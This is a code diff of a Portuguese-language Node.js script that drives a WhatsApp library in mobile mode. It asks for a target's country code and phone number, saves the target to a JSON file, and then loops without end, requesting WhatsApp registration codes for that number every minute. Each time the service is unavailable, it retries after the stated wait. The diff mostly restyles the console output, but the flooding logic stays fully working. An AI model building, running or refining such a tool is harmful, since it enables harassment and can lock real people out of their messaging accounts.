@@ -11,86 +11,110 @@ const creatorInfo = {
     whatsapp: '+55 66 9281-8852'
 };
 
-// Função para exibir informações do criador
+// Função para exibir informações do criador com cores vibrantes
 const displayCreatorInfo = () => {
     console.clear();
-    console.log(gradient('cyan', 'green', 'yellow')('Informações do Criador:'));
-    console.log(gradient('cyan', 'green', 'yellow')(`Canal: ${creatorInfo.channelName}`));
-    console.log(gradient('cyan', 'green', 'yellow')(`Instagram: ${creatorInfo.instagram}`));
-    console.log(gradient('cyan', 'green', 'yellow')(`WhatsApp: ${creatorInfo.whatsapp}`));
-    console.log(gradient('cyan', 'green', 'yellow')('■'));
-    console.log(gradient('cyan', 'green', 'yellow')('■'));
-    console.log(gradient('cyan', 'green', 'yellow')('■'));
+    const separator = gradient(['#ff00ff', '#8a2be2', '#4b0082'])('■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■');
+    console.log(separator);
+    console.log(gradient(['#ff00ff', '#8a2be2', '#4b0082'])('Informações do Criador:'));
+    console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])(`Canal: ${creatorInfo.channelName}`));
+    console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])(`Instagram: ${creatorInfo.instagram}`));
+    console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])(`WhatsApp: ${creatorInfo.whatsapp}`));
+    console.log(separator);
+};
+
+// Função para exibir "Carregando" com troca de cores
+const showLoading = (duration = 6000) => {
+    return new Promise((resolve) => {
+        const loadingTexts = ['Carregando', 'Carregando.', 'Carregando..', 'Carregando...'];
+        let index = 0;
+
+        const interval = setInterval(() => {
+            console.clear();
+            console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])(loadingTexts[index]));
+            index = (index + 1) % loadingTexts.length; // Alterna entre os textos
+        }, 500); // Troca de cor e texto a cada 500ms para efeito mais dinâmico
+
+        // Após o tempo definido (por padrão 6 segundos), resolve a promessa e continua o código
+        setTimeout(() => {
+            clearInterval(interval);
+            resolve(); // Continua o código
+        }, duration);
+    });
 };
 
 // Carregar números de um arquivo JSON
 const loadNumbers = () => {
     try {
-        return JSON.parse(fs.readFileSync('./files/numbers.json'));
+        const data = fs.readFileSync('./files/numbers.json');
+        return JSON.parse(data);
     } catch (error) {
-        console.error(gradient('cyan', 'green', 'yellow')('Erro ao carregar números: ' + error));
-        return {};
+        console.error(gradient(['#ff00ff', '#8a2be2', '#4b0082'])('Erro ao carregar números: ' + error));
+        return {}; // Retorna um objeto vazio se houver erro
     }
-}
+};
+
+// Função para solicitar o código de verificação
+const requestVerificationCode = async (spam, { phoneNumber, ddi, number }) => {
+    while (true) {
+        try {
+            console.clear();
+            console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])(`[+] Solicitando código para ${ddi}${number}`));
+            
+            const res = await spam.requestRegistrationCode({
+                phoneNumber: `+${phoneNumber}`,
+                phoneNumberCountryCode: ddi,
+                phoneNumberNationalNumber: number,
+                phoneNumberMobileCountryCode: 724
+            });
+
+            if (res.reason === 'temporarily_unavailable') {
+                console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])(`Serviço temporariamente indisponível. Tentando novamente em ${res.retry_after} segundos.`));
+                setTimeout(() => requestVerificationCode(spam, { phoneNumber, ddi, number }), res.retry_after * 1000);
+                return;
+            } else {
+                console.log(gradient(['#ff00ff', '#ff1493', '#ff4500'])('Código solicitado com sucesso!'));
+            }
+            
+            // Aguardar 1 minuto antes de permitir outra solicitação
+            await new Promise(resolve => setTimeout(resolve, 60000));
+        } catch (error) {
+            console.error(gradient(['#ff00ff', '#ff1493', '#ff4500'])('Erro ao solicitar código: ' + error));
+        }
+    }
+};
 
 // Função principal para iniciar o aplicativo
 const start = async () => {
-    displayCreatorInfo(); // Exibe informações do criador
+    await showLoading(); // Exibe "Carregando" por 6 segundos antes de continuar
+    displayCreatorInfo(); // Exibe as informações do criador
 
-    const { state, saveCreds } = await useMultiFileAuthState('.oiii');
+    // Carregar estado de autenticação para o socket
+    const { state, saveCreds } = await useMultiFileAuthState('.auth_info');
 
-    // Use makeWASocket em vez de makeWaSocket
     const spam = makeWASocket({
         auth: state,
         mobile: true,
-        logger: pino({ level: 'silent' })
+        logger: pino({ level: 'silent' }) // Reduz a quantidade de logs desnecessários
     });
 
-    const numbers = loadNumbers(); // Carregar números existentes
-
-    // Função para "bloquear" número e solicitar códigos
-    const requestVerificationCode = async ({ phoneNumber, ddi, number }) => {
-        while (true) {
-            try {
-                console.clear();
-                console.log(gradient('cyan', 'green', 'yellow')('Solicitando código para ' + ddi + number));
-                
-                const res = await spam.requestRegistrationCode({
-                    phoneNumber: '+' + phoneNumber,
-                    phoneNumberCountryCode: ddi,
-                    phoneNumberNationalNumber: number,
-                    phoneNumberMobileCountryCode: 724
-                });
-
-                if (res.reason === 'temporarily_unavailable') {
-                    console.log(gradient('cyan', 'green', 'yellow')('Serviço temporariamente indisponível. Tentando novamente em ' + res.retry_after + ' segundos.'));
-                    setTimeout(() => requestVerificationCode({ phoneNumber, ddi, number }), res.retry_after * 1000);
-                    return;
-                } else {
-                    console.log(gradient('cyan', 'green', 'yellow')('Código solicitado com sucesso!'));
-                }
-                
-                // Aguardar um intervalo antes de solicitar novamente
-                await new Promise(resolve => setTimeout(resolve, 60000)); // Aguardar 1 minuto
-            } catch (error) {
-                console.error(gradient('cyan', 'green', 'yellow')('Erro: ' + error));
-            }
-        }
-    };
+    const numbers = loadNumbers(); // Carregar números existentes do arquivo JSON
 
     // Instanciar o prompt
-    const input = prompt(); // Inicializa o prompt
+    const input = prompt();
 
-    // Alteração das cores dos prompts para DDI e número
-    const ddi = input(gradient('cyan', 'green', 'yellow')('[+] Digite o DDD do alvo: '));
-    const number = input(gradient('cyan', 'green', 'yellow')('[+] Digite o número do alvo: '));
+    // Entrada do DDI e número com validação
+    const ddi = input(gradient(['#ff00ff', '#ff1493', '#ff4500'])('</> Digite o DDI do alvo: ')).trim();
+    const number = input(gradient(['#ff00ff', '#ff1493', '#ff4500'])('</> Digite o número do alvo: ')).trim();
     const phoneNumber = ddi + number;
 
     // Armazenar número no arquivo JSON
     numbers[phoneNumber] = { ddi, number };
-    fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'));
+    fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, 4)); // Formatação melhorada para JSON
 
-    await requestVerificationCode({ phoneNumber, ddi, number });
+    // Solicitar o código de verificação
+    await requestVerificationCode(spam, { phoneNumber, ddi, number });
 };
 
+// Iniciar a execução do aplicativo
 start();
